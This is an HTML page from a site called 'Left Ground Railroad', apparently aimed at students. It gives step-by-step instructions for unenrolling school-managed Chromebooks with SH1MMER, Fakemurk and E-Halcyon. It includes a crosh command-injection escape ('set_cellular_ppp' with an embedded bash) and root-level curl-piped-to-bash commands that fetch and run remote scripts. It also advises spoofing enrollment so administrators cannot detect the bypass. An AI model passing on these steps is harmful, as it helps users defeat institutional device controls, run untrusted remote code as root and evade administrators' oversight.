@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Left Ground Railroad</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <header>
+    <nav>
+      <ul>
+        <li><a href="Index.html">Home</a></li>
+        <li><a href="EXR.html">Extensions Restrictions</a></li>
+        <li><a href="WIFI.html">Wi-Fi Restrictions</a></li>
+        <li><a href="UNROLL.html">Unenrollment</a></li>
+        <li><a href="other.html">Other</a></li>
+
+      </ul>
+    </nav>
+  </header>
+
+  <section class="content">
+   <h1>What is unenrollment?</h1>
+ <p> Unenrollment is where you completely remove all restrictions and management on a chrome (Unenrolling from the school system/management)</p>  
+   
+    <h1>Shimmer</h1>
+    <p><a href="https://sh1mmer.me">Shimmer </a> is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by the Mercury Workshop team and was released on January, Friday the 13th, 2023
+</p>
+<p>What you will need:</p>
+<ul style="line-height: 150%;">
+<li>A USB with at least 8 GBs of storage</li>
+<li>A personal computer or chromebook; note that you need admin perms on Windows/MacOS</li>
+</ul>
+<h4>Writing to usb</h4>
+<ul style="line-height: 150%;">
+<li>First, you'll need to find your managed Chromebook's board name. This can be done by going to chrome://version on your Chromebook and copying the word after "stable-channel", or with a variety of other methods.</li>
+</ul>
+<p>If your board name is in the list below, your board has a publicly leaked RMA shim. If it's not, you'll have to source it on your own... somehow. (to find your board name go to chrome://version) </p>
+
+    <div class="boards"><b> brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacuzzi, kukui, nami, octopus, orco, pyro, reks, sentry, stout, strongbad, tidus, ultima, volteer, zork  </b>  </div>
+<ul style="line-height: 150%"> <li>First you need to download a sh1mmer bin. Download a shim at <a href="shim.the-repo.org">shim.the-repo.org</a> and build it with the <a href="https://sh1mmer.me/builder">shimmer web builder</a> (<a href="https://files.ultimatesrv.com/">https://files.ultimatesrv.com</a> & <a href="https://build.ultimatesrv.com/">https://files.ultimatesrv.com</a>).
+</li></ul>
+<p>Once you've obtained a <b>MODIFIED SHIM </b>(NOT A RAW SHIM), you can continue. You can also be able to receive shim from <a href="https://archive.org/details/sh1mmer">//archive.org/details/sh1mmer</a> and <a href="https://dl.sh1mmer.me">//dl.sh1mmer.me</a>. 
+</p>
+<ul style="line-height: 150%;">
+<li>Download the Chromebook Recovery Utility extension on your personal computer as well.
+</li>
+<li>Once the downloads are complete, launch the recovery utility and plug your USB into your personal computer. Note that your USB will be completely cleared and partitioned </li>
+<li>In the recovery utility window, click the settings icon and press "use local image".
+</li>
+<li>Select your shim file, identify your USB, and start the writing process. This will take about 10 minutes.
+</li>
+</ul>
+<p> Exucuting on Chromebook</p>
+<ul style="line-height:150%">
+<li>Once writing is complete, enter recovery mode on your Chromebook. This is done by pressing the power button, reload key (↻), and esc key at the same time. Your screen should look one of the images below:
+</li>
+</ul>
+<img src="Confirm(1).png" alt="Img not showing RN :C"> 
+<img src="confirm(2).png" alt="Img not showing RN :C">
+<ul style="line-height:150%">
+<li>Press ctrl+d on this screen, then press enter.</li>
+</ul>  
+<p>It will now say something about "returning to secure mode" or that "OS verification is off". You will most likely not actually be in dev mode, but the exploit will work regardless. Your screen should look like one of the images below:
+</p>
+<ul style="line-height:150%">
+<li> On this screen, press the power button, reload key (↻), and esc key at the same time again! <b>This is very important and cannot be skipped.</b></li>
+<li>Once it re-shows the original recovery screen, plug your shimmed USB into your Chromebook, and press the power button, reload key (↻), and esc key again. After a brief black-and-white loading screen, you should be in the SH1MMER menu.</li>
+<li>From here you can play around with the UI, exit, and reboot. </li>
+</ul>
+<img src="sh1mmer-menu.jpg" alt="Img not showing Rn :C">
+
+<h1>Shroot</h1>
+<p>With shroot (shell)/(root) you can get shell access on your chromebook in verified mode. More methods are available at <a href="https://coolelectronics.me/unroll">coolelectronics website</a>. 
+</p>
+
+<p> V91 - Crosh:</p>
+<ul styles="line-height:150%">
+    <li>downgrade to 91 and run <i>set_cellular_ppp \';bash;\'</i>  in crosh</li>
+</ul>
+<p>in here you can permanently remove your extensions;<i> rm -r ~/Extensions/* </i>and <i></i>chmod -R 0000 ~/Extensions but if you want the really cool stuff then you can escalate to root and you can unenroll your chromebook :o
+</p>
+<ul style="line-height:150%">\
+<li>Run "bash <(curl -k https://coolelectronics.me/unroll)"" 
+</li>
+<li>Wait for the script to finish, then powerwash your chromebook
+</li></ul>
+
+<p>Steps to Re-Enroll when you turn your chromebook back in at the end of the year:</p>
+<ul styles="line-height:150%">
+<li>Enable Devmode (ESC+Power+Reload, ctrl d and enter on recovery screen)
+</li>
+<li>Once in chrome, Open crosh (ctrl + alt + t)
+</li>
+<li>Type in "shell"
+</li>
+<li>Type in "sudo vpd -i RW_VPD -s check_enrollment=1"
+</li>
+<li>Powerwash again
+</li>
+</ul>
+
+<h1>Fakemurk</h1>
+<p><a href="https://github.com/MercuryWorkshop/fakemurk">Fakemurk</a> is a tool intended for use on an already unenrolled chromebook. It will allow you to re-enroll, making your chromebook appear identical to an enrolled one, except keep developer mode, and even boot off a linux USB, all while tricking chromeOS into thinking you're in verified mode, so your chromebook will not show up any different from the hundreds of other chromebooks in your enterprise's google admin console.
+</p>
+<p>Now, we're also going to go out on a limb here and say that if you're a student, there's a good chance your local sysadmin does not want you to be unenrolling, and if you have a more nosy one, they're gonna try and find people unenrolling. There's also a good chance you didn't properly cover your tracks, and certain logs in the google admin console can reveal you. Your school might also require the use of kiosk apps for tests, and you might not know how to spoof them. You also might not know your school's wifi password, but still want to be free of restrictions and spying at home
+</p>
+<p>For best results, we recommend recovering with a 107 recovery image prior to running the script. It makes things more consistent and less likely to randomly fail.
+</p>
+<p>How to use:
+</p>
+<ul styles="line-height: 150%">
+<li>Have an unenrolled chromebook and you want to turn devmode on.</li>
+<li>Next, head over to chrome-untrusted://crosh, type shell and then type out the following commands: </li>
+</ul>
+<div class="boards"> <i>sudo -i
+    bash <(curl -SLk https://github.com/MercuryWorkshop/fakemurk/releases/latest/download/fakemurk.sh)</i>
+    </div>
+
+<p>Do everything it tells you to, and your chromebook will reboot. If you get an error about a filesystem being readonly run fsck -f $(rootdev) then reboot.
+</p>
+<h4>READ THIS IT IS IMPORTANT!!!</h4>
+ <p>If you simply press ctrl-d on the devmode screen and proceed as normal, there's a good chance you'll be stuck on the "enrolling device" screen forever, then get an enrollment error complaining about a certificate.
+</p>
+<p>IF THIS HAPPENS, what you want to do is press refresh+power to reboot the chromebook, when it gives you the os verification screen press space to disable devmode, and then press refresh+power. This will result in a "Chrome OS is missing or damaged" screen. THIS IS SUPPOSED TO HAPPEN!. Press escape+refresh+power, then ctrl+d and enter to reenable devmode. When you get back to the "OS verification screen" press Ctrl-D to boot.
+</p>
+<p>If you get another "Chrome OS is missing" screen, and you're absolutely sure that you didn't press space after the re-enable step, you might have run into a semi-common bug. We haven't pinned down the cause of this yet, but it can usually be fixed by downgrading/recovering to a 107 or 105 image, then restarting all the steps from the beginning, but make sure to omit the devmode cycle steps above, and just keep devmode on the entire time.
+</p>
+<p>note that if you have a "dedede" chromebook, the steps for enabling and disabling devmode are slightly different but you should already know or know how to google)
+</p>
+
+<h1>E-Halcyon</h1>
+<p><a href="fog.gay">E-Halcyon</a> is a bypass for "The Fog," which is Google's mitigation for the unenrollment and downgrading of Chrome OS devices. It allows you to downgrade and bypass enterprise enrollment on Chromebooks, even if it's received the update that patched downgrading and enrollment escape.</p>
+
+<p>E-Halcyon is developed by Mercury Workshop, the same developers behind <a href="https://sh1mmer.me">Shimmer </a>.</p>
+<p>
+    Instructions:
+    First of all, you'll need a linux PC or VM. WSL is not guaranteed to work
+    </p>
+<ul style="line-height: 150%;">
+<li>Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 update patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on <a href="sh1mmer.me">sh1mmer.me</a> for unenrollment before proceeding with the rest of the tutorial here
+</li>
+<li>Next, you need a version 107 recovery image corresponding to your board, which you can pick up from chrome100.dev. Once you've downloaded the right image for your board and have confirmed it's for version 107, unzip it and save it to a safe place. Now open up a terminal and type in the following commands (make sure to replace /path/to/recovery/image.bin with the actual path)
+
+</li>
+</ul>
+<div class="boards" > git clone https://github.com/MercuryWorkshop/RecoMod
+    cd RecoMod
+    chmod +x recomod.sh
+    sudo ./recomod.sh -i /path/to/recovery/image.bin --halcyon --rw_legacy
+    
+    </div>
+    <p>The script will modify the image in place, and it can now be flashed with a standard recovery tool onto a USB of your choice.
+    </p>
+<ul styles="line-height: 150%">
+<li>Enable developer mode and get to the dev mode block screen similarly to how you would with SH1MMER, then plug in the USB. The recovery screen will show up, and at this point you need to start spamming the E key on your keyboard. It will begin a 5 minute wait sequence, and near the end of the 5 minutes start spamming E again. You will only have to wait 5 minutes once, subsequent boots will have the 5 minute wait omitted
+</li>
+<li>The boot splash will show, and you will enter a special menu. Use arrow keys to navigate the cursor down to "activate halcyon environment" and press enter. Then navigate down to "Install halcyon semi-tethered" and wait for it to finish. Once it's finished, go back to "activate halcyon environment" and press "Boot halcyon semi-tethered". and you will be booted into a downgraded and unenrolled ChromeOS environment.
+
+</li>
+</ul>
+
+</section>
+<img src="16946679728279883.png" alt="poop">
+
+  <section class="services">
+  </section>
+
+
+  <footer>
+    <p>&copy; 2023 Left Ground LLC</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
+
